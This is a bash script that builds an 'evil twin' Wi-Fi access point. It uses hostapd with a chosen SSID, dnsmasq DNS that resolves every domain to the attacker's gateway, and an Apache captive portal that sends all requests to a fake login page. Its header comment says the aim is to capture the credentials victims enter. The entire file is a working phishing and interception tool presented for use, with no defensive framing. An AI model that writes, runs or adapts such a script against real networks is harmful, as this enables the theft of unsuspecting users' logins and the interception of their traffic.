#!/usr/bin/bash

# This script spawns a captive portal (of the users choice) that is used to 
# act as an evil twinning mirroring a legitimate one. T-shark is used in the
# background to capture the information used to log-in to the fake ap.


# puts specified interface into monitor mode
monitor_mode() {
	echo "[+] Putting $1 into monitor mode..."
	
    ifconfig $1 down
    iwconfig $1 mode monitor
    ifconfig $1 up

	echo "[+] Killing NetworkManager"
    service NetworkManager stop
}


# starts dhcp server
start_dhcp() {

    {
        echo 'interface='"$1"''
        echo 'dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h'
        echo 'dhcp-option=3,10.0.0.1'
        echo 'dhcp-option=6,10.0.0.1'
        echo 'address=/#/10.0.0.1'
    } > dnsmasq.conf

    echo "[+] Starting dnsmasq..."
    dnsmasq -C dnsmasq.conf
}

# configures firewall rules and interface to run as fakeap
config_iface() {
    echo -e "\n[+] Configuring $1 to have gateway ip..."

    iptables -F
    ifconfig $1 10.0.0.1
    sysctl -w net.ipv4.ip_forward=1 > /dev/null
}

# start fake ap with hostapd
start_fake_ap() {
    echo -e "\nEnter the name for the fake ap: "
    read ssid

    echo -e "\nEnter the channel to operate on: "
    read channel

    echo -e "\n[+] Creating fakeap with hostapd...\n"

    {
        echo 'interface='"$1"''
        echo 'driver=nl80211'
        echo 'ssid='"$ssid"''
        echo 'hw_mode=g'
        echo 'channel='"$channel"''
        echo 'macaddr_acl=0'
        echo 'ignore_broadcast_ssid=0'
        echo 'auth_algs=1'
    } > hostapd.conf

    hostapd hostapd.conf
}


# starting apache
start_apache() {
    echo -e "\nMake sure you have your fake web page stored in /var/www/html and named index.html"
    echo "Press ENTER to continue"
    read

    {
        echo '<VirtualHost *:80>'
        echo '  ErrorDocument 404 /'

        echo '  ServerAdmin webmaster@localhost'
        echo '  DocumentRoot /var/www/html'
            
        echo '  ErrorLog ${APACHE_LOG_DIR}/error.log'
        echo '  CustomLog ${APACHE_LOG_DIR}/access.log combined'
        echo '</VirtualHost>'

        echo '<Directory "/var/www/html">'
        echo '  RewriteEngine On'
        echo '  RewriteBase /'
        echo '  RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]'
        echo '  RewriteRule ^(.*)$ http://%1/$1 [R=301,L]'

        echo '  RewriteCond %{REQUEST_FILENAME} !-f'
        echo '  RewriteCond %{REQUEST_FILENAME} !-d'
        echo '  RewriteRule ^(.*)$ / [L,QSA]'
        echo '</Directory>'
    } > /etc/apache2/sites-enabled/captive_portal.conf

    apache_status=$(pgrep apache2)

    if [ -z "$apache_status" ]; then
        echo "[+] Starting apache"
        systemctl start apache2
    else
        echo "[+] Apache already started. Restarting..."
        systemctl restart apache2
    fi

}

# delete configs and revert changes
clean_up() {
    echo -e "\n[+] Reverting changes made..."
    echo "[+] Restarting Network manager..."
    service NetworkManager restart

    echo "[+] Stopping apache2 and removing captive portal configuration..."
    service apache2 stop
    rm /etc/apache2/sites-enabled/captive_portal.conf

    echo "[+] Killing dnsmasq and deleting hostapd and dnsmasq config files..."
    pkill dnsmasq
    rm hostapd.conf dnsmasq.conf
    echo "[+] Exiting..."
}


# forces script to be run as root
if [[ $EUID -ne 0 ]]; then
    echo "[-] This script must be run as root."
    echo "[-] Exiting..." 
    exit 1
fi

# ensures interface is specified as arg
if [ $# -ne 1 ]; then
	echo "[-] Interface not specified."
	echo -e "\tUsage: ./et_captive_portal.sh <interface name>"
    echo "[-] Exiting"
	exit 1
fi

iface=$1
monitor_mode $iface
config_iface $iface
start_dhcp $iface
start_apache
start_fake_ap $iface
clean_up